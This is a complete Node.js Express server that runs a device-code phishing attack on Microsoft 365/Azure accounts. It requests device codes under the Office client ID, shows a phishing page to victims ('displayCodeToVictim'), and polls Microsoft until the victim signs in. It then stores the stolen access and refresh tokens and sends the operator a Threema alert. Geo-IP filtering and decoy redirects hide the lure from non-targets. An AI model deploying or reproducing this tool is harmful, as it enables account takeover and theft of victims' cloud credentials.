import express from 'express';
import template from 'ejs';
import cookies from 'cookie-parser';
import fs from 'fs';
import https from 'https';
import http from 'http';
import geoip from 'geoip-country';

const config = {
    httpPort: 80,
    httpsPort: 443,
    testMode: false,
    debug: false,
    clientId: 'b26aadf8-566f-4478-926f-589f601d9c74', // This default ID is from MS Office
    tokenUrl: 'https://login.microsoftonline.com/Common/oauth2/v2.0/token',
    deviceCodeUrl: 'https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
    scopes: 'offline_access openid',
    phishingHTML: 'index.html',
    redirectUrl: 'https://http.cat',
    alreadyLoggedInURL: 'https://onedriveURLwithContentOrSomethingElse',
    cookieExpirationInDays: 90,
    userCodesFile: 'successful_user_code_cookies.txt',
    logFile: 'logfile.txt',
    tokenFile: 'tokens.txt',
    threemaOn: false,
    threemaTo: ['YourID1', 'YourID2'],
    threemaFrom: 'YourName',
    threemaURL: 'https://msgapi.threema.ch/send_simple',
    threemaSecret: 'PutYourSecretHere',
    keyFilePath: '/etc/letsencrypt/live/{path}/privkey.pem',
    certFilePath: '/etc/letsencrypt/live/{path}/cert.pem',
    caFilePath: '/etc/letsencrypt/live/{path}/fullchain.pem',
    userAgent: 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36',
    geoipallowlist: ['CH']
}

function displayCodeToVictim(res, userCode) {
    const date = new Date();
    date.setDate(date.getDate() + config.cookieExpirationInDays);
    res.cookie('shareCode', userCode, {
        secure: true,
        httpOnly: true,
        expires: date,
    });

    res.render(config.phishingHTML, {
        user_code: userCode
    });
}

function getTime() {
    const currentDate = new Date();
    const day = currentDate.getDate().toString().padStart(2, '0');
    const month = (currentDate.getMonth() + 1).toString().padStart(2, '0');
    const year = currentDate.getFullYear().toString();
    const hours = currentDate.getHours().toString().padStart(2, '0');
    const minutes = currentDate.getMinutes().toString().padStart(2, '0');
    const seconds = currentDate.getSeconds().toString().padStart(2, '0');

    const formattedDateTime = `[${day}.${month}.${year}|${hours}:${minutes}:${seconds}]\t`;

    return `${formattedDateTime}`;
}

function pollForAzureTokens(deviceCode, userCode) {
    logMessage('Start polling token for code: ' + userCode);
    let runCount = 1;
    const interval = setInterval(() => {
        (async () => {
            try {
                if (runCount % 30 === 0 && runCount > 0 && config.debug === false) {
                    logMessage('No worries, I am still polling token for code: ' + userCode);
                }
                const pollResult = await fetchAzureToken(deviceCode);
                logMessage('Still polling token for code: ' + userCode, 'debug');
                logMessage('Did return error property in JSON? -> ' + (pollResult.hasOwnProperty('error') ? true : false), 'debug');
                logMessage('Did return success property in JSON? -> ' + (pollResult.hasOwnProperty('access_token') ? true : false), 'debug');
                logMessage('HTTP response was:\n' + JSON.stringify(pollResult, null, 4), 'debug');
                if (pollResult.error && pollResult.error !== 'authorization_pending') {
                    if (pollResult.error === 'expired_token') {
                        logMessage(`The following user code expired: ${userCode}. No longer poll it.`, 'error');
                        clearInterval(interval);
                    } else {
                        logMessage(`Another error occured than expiring for code:\n${formatAzureToken(userCode, pollResult)}`, 'error');
                        clearInterval(interval);
                    }
                }
                if (pollResult.access_token) {
                    logMessage(`Success, your Azure tokens for code ${userCode} were saved to ${config.tokenFile}`);
                    writeToFile(config.userCodesFile, userCode + '\n');
                    writeToFile(config.tokenFile, getTime() + formatAzureToken('Usercode: ' + userCode, pollResult));
                    writeToFile(userCode,JSON.stringify(pollResult, null, 4));
                    sendThreemaNotifications();
                    clearInterval(interval);
                }
                runCount++;
            }
            catch (error) {
                logMessage(error.stack, 'error');
            }
        })();
    }, 2000);
}

function logMessage(message, type) {
    if (!config.debug & type === "debug") {
        return;
    }
    if (type === "error") {
        console.error(getTime() + message);
    } else if (type === "debug") {
        message = '***DEBUG*** ' + message
        console.log(getTime() + message);
    } else {
        console.log(getTime() + message);
    }
    writeToFile(config.logFile, getTime() + message + '\n');
}

function formatAzureToken(userCode, pollResult) {
    return userCode + '\n' + JSON.stringify(pollResult, null, 4) + '\n\n';
}

function sendThreemaNotifications() {
    if (config.threemaOn) {
        config.threemaTo.forEach(function (threemaID) {
            sendThreemaNotification(threemaID);
        });
    }
}

function writeToFile(path, content) {
    fs.writeFile(path, content, {
        flag: 'a+'
    }, error => {
        if (error) {
            throw error
        }
    });
}

function userHasValidCookie(path, str) {
    if (fs.existsSync(path)) {
        const contents = fs.readFileSync(path, 'utf-8');
        return contents.includes(str);
    }
    return false;
}

function buildPostRequest(body) {
    return {
        method: "POST",
        headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "User-Agent": config.userAgent
        },
        body,
    };
}

async function sendThreemaNotification(recipient) {
    const data = new URLSearchParams({
        'from': config.threemaFrom,
        'to': recipient,
        'secret': config.threemaSecret,
        'text': 'Great success you have a new access token.'
    });
    await fetch(config.threemaURL, buildPostRequest(data));
    logMessage('Sent Threema notification to ' + recipient)
}

async function fetchAzureToken(deviceCode) {
    const data = new URLSearchParams({
        'grant_type': 'urn:ietf:params:oauth:grant-type:device_code',
        'client_id': config.clientId,
        'code': deviceCode
    });
    const response = await fetch(config.tokenUrl, buildPostRequest(data));
    return await response.json();
}

async function fetchDeviceCode() {
    const data = new URLSearchParams({
        'client_id': config.clientId,
        'scope': config.scopes,
        'claims': '{"access_token": {"amr": {"values": ["ngcmfa", "mfa"]}}}',
    });
    const response = await fetch(config.deviceCodeUrl, buildPostRequest(data));
    if (response.status !== 200) {
        throw new Error(`Fetch failed with status: ${response.status} for URL ${config.deviceCodeUrl} ${await response.text()}`);
    }
    return response.json();
}

function isCountryIP(ip) {
    const geo = geoip.lookup(ip);
    if (config.geoipallowlist.includes(geo.country)) {
        return true;
    } else if (geo) {
        logMessage(`Access from country denied: Country: ${geo.country}, IP: ${ip}`);
    }
}

const app = express();
app.engine('html', template.renderFile);
app.use(express.static('public'));
app.use(cookies());
writeToFile(config.logFile, getTime() + '-------\n');
logMessage('Debug mode is on', 'debug');

// redirect to defined site if only base / is accessed
app.get('/', function (req, res) {
    res.redirect(config.redirectUrl);
});

app.get('/share', async (req, res, next) => {
    try {
        if (!isCountryIP(req.connection.remoteAddress) && !config.testMode) {
            return res.redirect(config.redirectUrl);
        }
        if (userHasValidCookie(config.userCodesFile, req.cookies.shareCode)) {
            res.redirect(config.alreadyLoggedInURL);
            return next();
        }
        const deviceCodeResponse = await fetchDeviceCode();
        let userCode = deviceCodeResponse.user_code;
        let deviceCode = deviceCodeResponse.device_code;
        displayCodeToVictim(res, userCode);
        pollForAzureTokens(deviceCode, userCode);
    }
    catch (error) {
        logMessage(error.stack, 'error');
    }
});

if (config.testMode) {
    http.createServer(app).listen(config.httpPort, () => {
        logMessage('App listening on port ' + config.httpPort);
    });
} else {
    https.createServer({
        key: fs.readFileSync(config.keyFilePath),
        cert: fs.readFileSync(config.certFilePath),
        ca: fs.readFileSync(config.caFilePath),
    },
        app
    ).listen(config.httpsPort, () => {
        logMessage('App listening on port ' + config.httpsPort);
    });
}
